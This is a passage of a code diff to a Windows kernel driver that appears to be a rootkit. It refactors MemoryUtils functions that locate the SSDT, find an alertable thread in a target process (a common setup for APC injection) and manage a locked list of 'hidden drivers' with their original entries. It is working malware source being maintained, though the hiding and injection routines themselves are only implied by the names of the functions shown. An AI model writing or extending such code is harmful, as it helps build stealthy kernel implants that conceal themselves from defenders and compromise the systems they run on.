 	PFULL_IMAGE_NT_HEADERS ntHeaders = (PFULL_IMAGE_NT_HEADERS)((PUCHAR)ntoskrnlBase + dosHeader->e_lfanew);
 
 	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
-		goto CleanUp;
+		return STATUS_INVALID_ADDRESS;
 
 	PIMAGE_SECTION_HEADER firstSection = (PIMAGE_SECTION_HEADER)(ntHeaders + 1);
 
@@ -1064,9 +1083,6 @@ NTSTATUS MemoryUtils::GetSSDTAddress() {
 		}
 	}
 
-CleanUp:
-	if (info)
-		ExFreePoolWithTag(info, DRIVER_TAG);
 	return status;
 }
 
@@ -1128,24 +1144,22 @@ NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	PSYSTEM_PROCESS_INFO originalInfo = NULL;
 	PSYSTEM_PROCESS_INFO info = NULL;
 	ULONG infoSize = 0;
+
+	MemoryAllocator<PSYSTEM_PROCESS_INFO> originalInfoAllocator(originalInfo, infoSize, PagedPool);
 	NTSTATUS status = ZwQuerySystemInformation(SystemProcessInformation, NULL, 0, &infoSize);
 
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
-		if (originalInfo) {
-			ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-			originalInfo = NULL;
-		}
+		status = originalInfoAllocator.Realloc(infoSize);
 
-		originalInfo = (PSYSTEM_PROCESS_INFO)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);
-
-		if (!originalInfo)
-			return STATUS_INSUFFICIENT_RESOURCES;
+		if (!NT_SUCCESS(status))
+			return status;
 
 		status = ZwQuerySystemInformation(SystemProcessInformation, originalInfo, infoSize, &infoSize);
 	}
 
 	if (!NT_SUCCESS(status) || !originalInfo)
-		goto CleanUp;
+		return status;
+
 	status = STATUS_NOT_FOUND;
 
 	// Using another info variable to avoid BSOD on freeing.
@@ -1161,16 +1175,19 @@ NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	}
 
 	if (!NT_SUCCESS(status))
-		goto CleanUp;
+		return status;
 
 	// Finding a suitable thread.
 	for (ULONG i = 0; i < info->NumberOfThreads; i++) {
-		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThread())
+		if (info->Threads[i].ClientId.UniqueThread == PsGetCurrentThreadId())
 			continue;
 
 		status = PsLookupThreadByThreadId(info->Threads[i].ClientId.UniqueThread, Thread);
 
-		if (!NT_SUCCESS(status) || PsIsThreadTerminating(*Thread)) {
+		if (!NT_SUCCESS(status))
+			continue;
+
+		if (PsIsThreadTerminating(*Thread)) {
 			ObDereferenceObject(*Thread);
 			*Thread = NULL;
 			continue;
@@ -1191,13 +1208,6 @@ NTSTATUS MemoryUtils::FindAlertableThread(HANDLE pid, PETHREAD* Thread) {
 	}
 
 	status = *Thread ? STATUS_SUCCESS : STATUS_NOT_FOUND;
-
-CleanUp:
-	if (originalInfo) {
-		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
-		originalInfo = NULL;
-	}
-
 	return status;
 }
 
@@ -1212,7 +1222,9 @@ CleanUp:
 * @status [ULONG]			  -- If found the index else ITEM_NOT_FOUND.
 */
 ULONG MemoryUtils::FindHiddenDriver(HiddenDriverItem item) {
-	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++)
+	AutoLock lock(this->hiddenDrivers.Lock);
+
+	for (ULONG i = 0; i <= this->hiddenDrivers.LastIndex; i++)
 		if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0)
 			return i;
 	return ITEM_NOT_FOUND;
@@ -1229,23 +1241,29 @@ ULONG MemoryUtils::FindHiddenDriver(HiddenDriverItem item) {
 * @status [bool]			 -- Whether successfully added or not.
 */
 bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
+	AutoLock lock(this->hiddenDrivers.Lock);
+
 	for (ULONG i = 0; i < MAX_HIDDEN_DRIVERS; i++)
 		if (this->hiddenDrivers.Items[i].DriverName == nullptr) {
-			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, wcslen(item.DriverName) * sizeof(WCHAR) + 1, DRIVER_TAG);
+			SIZE_T bufferSize = (wcslen(item.DriverName) + 1) * sizeof(WCHAR);
+			WCHAR* buffer = (WCHAR*)ExAllocatePoolWithTag(PagedPool, bufferSize, DRIVER_TAG);
 
 			if (!buffer)
 				return false;
 
-			memset(buffer, 0, wcslen(item.DriverName) * sizeof(WCHAR) + 1);
+			memset(buffer, 0, bufferSize);
 
 			__try {
-				RtlCopyMemory(buffer, item.DriverName, wcslen(item.DriverName) * sizeof(WCHAR));
+				RtlCopyMemory(buffer, item.DriverName, bufferSize);
 			}
 			__except (EXCEPTION_EXECUTE_HANDLER) {
 				ExFreePoolWithTag(buffer, DRIVER_TAG);
 				return false;
 			}
 			
+			if (i > this->hiddenDrivers.LastIndex)
+				this->hiddenDrivers.LastIndex = i;
+
 			this->hiddenDrivers.Items[i].DriverName = buffer;
 			this->hiddenDrivers.Items[i].originalEntry = item.originalEntry;
 			this->hiddenDrivers.Count++;
@@ -1265,15 +1283,24 @@ bool MemoryUtils::AddHiddenDriver(HiddenDriverItem item) {
 * @status [bool]			 -- Whether successfully removed or not.
 */
 bool MemoryUtils::RemoveHiddenDriver(HiddenDriverItem item) {
-	for (ULONG i = 0; i < this->hiddenDrivers.Count; i++) {
-		if (this->hiddenDrivers.Items[i].DriverName != nullptr)
+	ULONG newLastIndex = 0;
+	AutoLock lock(this->hiddenDrivers.Lock);
+
+	for (ULONG i = 0; i <= this->hiddenDrivers.LastIndex; i++) {
+		if (this->hiddenDrivers.Items[i].DriverName != nullptr) {
 			if (_wcsicmp(this->hiddenDrivers.Items[i].DriverName, item.DriverName) == 0) {
 				ExFreePoolWithTag(this->hiddenDrivers.Items[i].DriverName, DRIVER_TAG);
-				this->hiddenDrivers.Items[i].DriverName = NULL;
+
+				if (i == this->hiddenDrivers.LastIndex)
+					this->hiddenDrivers.LastIndex = newLastIndex;
+				this->hiddenDrivers.Items[i].DriverName = nullptr;
 				this->hiddenDrivers.Items[i].originalEntry = NULL;
 				this->hiddenDrivers.Count--;
 				return true;
 			}
+			else
+				newLastIndex = i;
+		}
 	}
 
 	return false;
@@ -1290,9 +1317,22 @@ bool MemoryUtils::RemoveHiddenDriver(HiddenDriverItem item) {
 * @status	  [bool]  -- Whether successfully removed or not.
 */
 bool MemoryUtils::RemoveHiddenDriver(ULONG index) {
-	if (index < MAX_HIDDEN_DRIVERS && index < this->hiddenDrivers.Count) {
+	ULONG newLastIndex = 0;
+	AutoLock lock(this->hiddenDrivers.Lock);
+
+	if (index <= this->hiddenDrivers.LastIndex) {
 		if (this->hiddenDrivers.Items[index].DriverName != nullptr) {
 			ExFreePoolWithTag(this->hiddenDrivers.Items[index].DriverName, DRIVER_TAG);
+
+			if (index == this->hiddenDrivers.LastIndex) {
+
+				// Only if this is the last index, find the next last index.
+				for (ULONG i = 0; i < index; i++) {
+					if (this->hiddenDrivers.Items[i].DriverName != nullptr)
+						newLastIndex = i;
+				}
+				this->hiddenDrivers.LastIndex = newLastIndex;
+			}
 			this->hiddenDrivers.Items[index].DriverName = NULL;
 			this->hiddenDrivers.Items[index].originalEntry = NULL;
 			this->hiddenDrivers.Count--;
